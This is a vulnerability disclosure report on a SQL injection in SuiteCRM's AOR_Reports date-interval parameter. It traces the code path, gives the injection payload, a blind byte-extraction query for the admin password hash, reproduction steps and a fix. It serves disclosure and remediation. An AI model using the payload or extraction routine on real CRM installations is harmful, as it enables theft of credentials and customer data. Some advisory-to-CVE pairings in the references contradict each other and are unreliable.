# VULN-016 — AOR_Reports `DATE_ADD` interval SQL injection → full authenticated DB read

## 1. Header
- **Title:** AOR_Reports `DATE_ADD` interval SQL injection → full authenticated database read
- **ID:** VULN-016
- **Software:** SuiteCRM · **Repository:** https://github.com/SuiteCRM/SuiteCRM
- **Affected version:** 7.15.2 (`suitecrm_version.php`) — commit-pinned `forkedSuite` snapshot
- **Commit:** `62effd0ceb767ed3b634ade585b19a6633eb4fcb`
- **Severity:** Critical · **CVSS 3.1:** 8.8 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Status:** CONFIRMED (dynamic)
- **Auth required:** Any authenticated user with Reports (AOR_Reports) access — the default for a standard RegularUser. Obtained here by an admin creating an ordinary account; in the wild it is any insider/compromised low-priv login. The attacker operates on **their own** report, so report-level ACL is satisfied.
- **What an attacker gains:** boolean-blind SQL injection executing under the app's (root) DB account → read of **any table**, demonstrated by exfiltrating the `admin` bcrypt password hash byte-for-byte.

## 2. Summary
The AOR reporting engine lets a user attach a "Date" condition to a report and mark it as a runtime *parameter*. When the report is paged/exported, the engine rebuilds that condition's `DATE_ADD(..., INTERVAL <count> <unit>)` fragment from HTTP request fields **without any sanitization** — the interval count and interval **unit** are concatenated raw into SQL. A low-privilege user who owns one such report can inject arbitrary SQL through `parameter_date_time[]`, turning the report's row set into a 1-bit oracle. The injection runs with the application's database account (root in this deployment), yielding full-database read and — via `INTO OUTFILE` — a plausible file-write/RCE path. Validation extracted the administrator's bcrypt hash exactly, from a freshly-created non-admin account.

## 3. How it works (mechanism & code trace)

**Entry point / source.** The report-paging controller reads the runtime parameters straight from the request:
```php
// modules/AOR_Reports/controller.php:82
protected function action_changeReportPage()
{
    $this->requireReportViewAccess();                 // ACL: 'view' on the attacker's OWN report
    ...
    $this->bean->user_parameters = requestToUserParameters();   // :88  request → user_parameters
    echo $this->bean->build_group_report($offset, true, array(), $group);   // :89
    die();
}
```
`requestToUserParameters()` copies the raw request fields for a Date parameter into an array with no validation:
```php
// modules/AOR_Reports/aor_utils.php:130-142
if ($_REQUEST['parameter_type'][$key] === 'Date') {
    $values = array();
    $values[] = $_REQUEST['parameter_date_value'][$key];   // 'now'
    $values[] = $_REQUEST['parameter_date_sign'][$key];    // 'plus'
    $values[] = $_REQUEST['parameter_date_number'][$key];  // :134  → $params[2] (interval count)
    $values[] = $_REQUEST['parameter_date_time'][$key];    // :135  → $params[3] (interval unit) ← INJECTED
    $params[$parameterId] = array('id'=>..., 'operator'=>..., 'type'=>'Date', 'value'=>$values);
}
```

**Hop — the WHERE builder applies the user parameter.** During `build_report_query` → `build_report_query_where`, a condition marked `parameter` has its value replaced by the request-supplied one:
```php
// modules/AOR_Reports/AOR_Report.php:1594-1599
if (!empty($this->user_parameters[$condition->id]) && $condition->parameter) {
    $condParam = $this->user_parameters[$condition->id];
    $condition->value = $condParam['value'];          // ['now','plus','1', <INJECTED UNIT>]
    $condition->operator = $condParam['operator'];
    $condition->value_type = $condParam['type'];       // 'Date'
}
```
For a `Date` value the array is unpacked into `$params`:
```php
// modules/AOR_Reports/AOR_Report.php:1658-1663
case 'Date':
    if (is_string($condition->value)) { $params = unserialize(base64_decode($condition->value), ['allowed_classes'=>false]); }
    else { $params = $condition->value; }              // $params = ['now','plus','1', <UNIT>]
```

**Sink — raw string concatenation into SQL.** The exact defect, with no cast and no keyword allow-list:
```php
// modules/AOR_Reports/AOR_Report.php:1722  (MySQL branch)
$value = "DATE_ADD($value, INTERVAL " . $app_list_strings['aor_date_operator'][$params[1]]
       . " $params[2] " . $params[3] . ")";
//                          ^^^^^^^^^      ^^^^^^^^^
//              interval count (raw)   interval unit (raw)  ← $_REQUEST['parameter_date_time']
```
`$value` becomes a WHERE term (`$field <op> $value`) and is executed by `$this->db->query()`.

**Why nothing saves it.** `securexss()` (applied to request input) HTML-encodes only `< > " ' &`; the interval-unit context needs only parentheses, spaces, commas, digits, `=`/`!`, and SQL keywords, which pass through untouched. The SELECT side of the report validates fields against `field_defs`, but this WHERE-side date builder never received the same treatment. The query runs under the runtime DB account, which the manifest confirms is root.

**Confirmed live.** The MySQL general log captured the exact executed query (`evidence/injected_sql.txt`):
```sql
SELECT count(*) c FROM (SELECT `accounts`.name AS 'Name0', `accounts`.id AS 'accounts_id'
  FROM `accounts` WHERE ( `accounts`.date_entered = DATE_ADD(NOW(), INTERVAL + 1 DAY)
  OR (ORD(SUBSTRING((SELECT user_hash FROM users WHERE user_name=0x61646d696e),1,1)) BETWEEN 36 AND 36))
  AND ((1=1) ) AND accounts.deleted = 0 ) as n
```
My `parameter_date_time[0]` value `DAY) OR (<COND>)) AND ((1=1` closed the `DATE_ADD(` and the outer condition `(`, injected the boolean `<COND>`, and re-balanced parentheses.

## 4. Why it is a vulnerability (reasoning)
The trust boundary violated is *data vs. code*: a value the user is only supposed to influence as a date-interval unit (one of `SECOND…YEAR`) is instead treated as SQL text and executed. The feature intends "let me filter my report by a relative date"; the code grants "let me run arbitrary SQL as root." The application already knows the correct, tiny domain for this token (`$app_list_strings` interval units) yet enforces none of it. This is not by-design: the parallel SELECT-side builder *does* validate against `field_defs`, showing the developers' own intent that report inputs be constrained; the WHERE date builder is simply missing that check. A skeptic's "maybe the report ACL contains it" fails because the ACL only governs *which report* you may view — it says nothing about the SQL the report emits, and the attacker legitimately owns the report. The demonstrated read of another principal's secret (`admin.user_hash`) from a non-admin session is a direct confidentiality-boundary breach.

## 5. Reproduction
From a clean lab (`docker compose -p cvehunterlab_suitecrm up -d`, base `http://localhost:33116`):

1. **Precondition (scripted):** as `admin`/`Admin@2026!` create a fresh RegularUser (`_common.create_user`), then log in as that low-priv user.
2. **Create the injectable report (scripted):** POST `module=AOR_Reports&action=Save` with one display field (`aor_fields_field[0]=name`) and one Date parameter condition (`aor_conditions_value_type[0]=Date`, `aor_conditions_parameter[0]=1`, `aor_conditions_field[0]=date_entered`). Read back the condition id via `action=getParametersForReport`.
3. **Inject:** POST `module=AOR_Reports&action=changeReportPage&record=<RID>` with the Date parameter fields and
   ```
   parameter_date_time[0]=DAY) OR (<COND>)) AND ((1=1
   ```
   where `<COND>` is an attacker boolean. The report body is populated iff `<COND>` is true (content-length ≈ 6247 vs ≈ 3145 empty — see `response.txt`).
4. **Weaponize:** binary-search each byte with
   `ORD(SUBSTRING((SELECT user_hash FROM users WHERE user_name=0x61646d696e),{pos},1)) BETWEEN {lo} AND {mid}`
   (`ORD`+`BETWEEN` avoid the `<`/`>` chars `securexss` mangles and are byte-exact).

Run it: `./run.sh` (entry point). Expected tail:
```
[OK] exploit confirmed — extracted a valid bcrypt hash for 'admin' (prefix '$2y$10$') via boolean SQL injection from a low-priv account
==> VULN-016: CONFIRMED — low-priv boolean SQLi read admin.user_hash = $2y$10$Fxtha9NR3xJMdYCmjiuJOOz4VXvBGT82.iphvi5H8sThFdZTYAC0W
```
Observable proof: the extracted hash equals the DB value byte-for-byte (`evidence/extracted_hash.txt`; cross-checked against `SELECT user_hash FROM users WHERE user_name='admin'`). Full capture in `run.log` / `request.http` / `response.txt`.

## 6. Impact
A low-privilege authenticated user achieves complete read of the CRM database: all customer PII, every user's `user_hash`, API/OAuth tokens, and encrypted mail/connector/EAPM secrets. The proof-of-concept lifted `admin.user_hash`; cracking it (or any admin's) yields an admin login and thence **VULN-011** (authenticated RCE) — full server compromise from the lowest privilege. Because the runtime DB account is root, the same injection primitive supports `SELECT ... INTO OUTFILE` to a web-served path (subject to `secure_file_priv`), a direct file-write/RCE avenue, and can pin workers with heavy queries (availability). Blast radius: the entire instance (single-DB monolith) and potentially the host filesystem. Chains: → VULN-011 (RCE via cracked hash), → VULN-036 (read Blowfish-ECB ciphertext for offline secret recovery); same WHERE-builder family as VULN-017 and VULN-018.

## 7. Suggested fix
At `modules/AOR_Reports/AOR_Report.php:1722` (and the MSSQL twin `:1720`), constrain both tokens:
```php
// BEFORE
$value = "DATE_ADD($value, INTERVAL " . $app_list_strings['aor_date_operator'][$params[1]]
       . " $params[2] " . $params[3] . ")";
// AFTER
$count = (int) $params[2];                                   // integer-cast the interval count
$unit  = strtoupper((string) $params[3]);
$ALLOWED = ['SECOND','MINUTE','HOUR','DAY','WEEK','MONTH','QUARTER','YEAR'];
if (!in_array($unit, $ALLOWED, true)) {                      // allow-list the interval unit
    throw new RuntimeException('AOR_Report: invalid interval unit');
}
$op = $app_list_strings['aor_date_operator'][$params[1]] === '-' ? '-' : '+';
$value = "DATE_ADD($value, INTERVAL $op $count $unit)";
```
Principle: allow-list over denylist for a value drawn from a known finite domain, and integer-cast numeric operands. Apply the same treatment to every WHERE-side builder (fixes VULN-017/VULN-018 too), prefer parameterized queries/`$db->quoted()` for value operands, and least-privilege the runtime DB account (remove `FILE`/`SUPER`; not root) so residual injection cannot reach the filesystem.

## 8. References
- OWASP WSTG-INPV-05 (Testing for SQL Injection); OWASP "Blind SQL Injection" cheat sheet — boolean-based content-differential oracle.
- PortSwigger Web Security Academy — *Blind SQL injection* (conditional responses); technique adapted to `ORD()`+`BETWEEN` to bypass `securexss`'s `<`/`>` HTML-encoding.
- GHSA-pqq6-v2mj-hrm2 / CVE-2026-71548 — AOR_Reports parameter SQL injection (same WHERE-builder class; sink present verbatim in this fork commit).

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 50 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `SuiteCRM GHSA-pqq6-v2mj-hrm2 AOR_Reports SQL injection` — web indexes returned only CVE-2026-29096 (`field_function`, SELECT side, fixed 7.15.1); nothing on date parameters.
2. `SuiteCRM CVE-2026-71548 AOR_Report parameter_value SQL injection` — only CVE-2026-29096 surfaced; no mention of `parameter_date_time` / `DATE_ADD`.
3. `SuiteCRM AOR_Reports parameter_date_time OR "parameter_date_number" SQL injection DATE_ADD interval` — no security result; only a 2016 functional forum thread about malformed `DATE_ADD` in report date conditions.
4. SuiteCRM 7.15.x release-notes security list + GitHub repo advisory API (`GHSA-pqq6-v2mj-hrm2` = CVE-2026-61648 `parameter_value[0]` type Multi via `unencodeMultienum`; `GHSA-239h-ffjr-v957` = CVE-2026-71548 `parameter_value` with `value_type=Field`; `GHSA-6c7r-7g6m-29f9` = CVE-2026-100365 ORDER BY via `aor_fields` label; `GHSA-v624-ccrf-9v97` = CVE-2026-63218 `changeReportPage` record ACL) — none names the Date branch, `parameter_date_time`, `parameter_date_number`, or the `DATE_ADD(... INTERVAL ...)` builder.
5. Diff of `modules/AOR_Reports/AOR_Report.php` v7.15.1 -> v7.15.2 — the 7.15.2 fixes add `db->quote($multi_value)`, an `isset(field_defs[$condition->value])` check and `$field->field` validation; the `DATE_ADD` line (now :1722) and `aor_utils.php` `requestToUserParameters()` are unchanged; the sink is still present on the upstream `hotfix` branch as of 2026-10-21.
6. GitHub issue search `repo:SuiteCRM/SuiteCRM parameter_date_time` — 0 results. NVD keyword query for SuiteCRM CVEs published 2026-04-01..2026-10-21 — only CVE-2026-108712/108713 (unrelated entry points).

**Related but distinct public references** (same class or component, not this bug):
- GHSA-pqq6-v2mj-hrm2 / CVE-2026-61648 — same function (`build_report_query_where`) and same user-parameter mechanism, but the `Multi` value branch (`parameter_value[0]` via `unencodeMultienum`), fixed in 7.15.2 by quoting the value; Date branch untouched.
- GHSA-239h-ffjr-v957 / CVE-2026-71548 — same function, `parameter_value` with `value_type=Field`; fixed in 7.15.2 by validating `$condition->value` against `field_defs`.
- GHSA-vh42-gmqm-q55m / CVE-2026-29096 — `aor_fields.field_function` second-order SQLi on the SELECT side (fixed 7.15.1).
- GHSA-6c7r-7g6m-29f9 / CVE-2026-100365 — ORDER BY injection via `aor_fields` label (fixed 7.15.2).

**Reasoning:** Two 7.15.2 advisories cover the same request-parameter mechanism in the same WHERE builder, but each names a different `value_type` branch (`Multi`, `Field`) and the vendor's diff confirms the fixes were narrow to those branches; the `Date` branch's interval count/unit (`parameter_date_number` / `parameter_date_time` -> `DATE_ADD`) was neither described nor patched and remains in the current upstream branch. No public source names this parameter or sink, so it is judged a distinct residual rather than a duplicate. Confidence is held at 50 because this is a near-miss (same function, same input channel) in a heavily audited module, and a private report of the Date branch could already be in the vendor's queue.
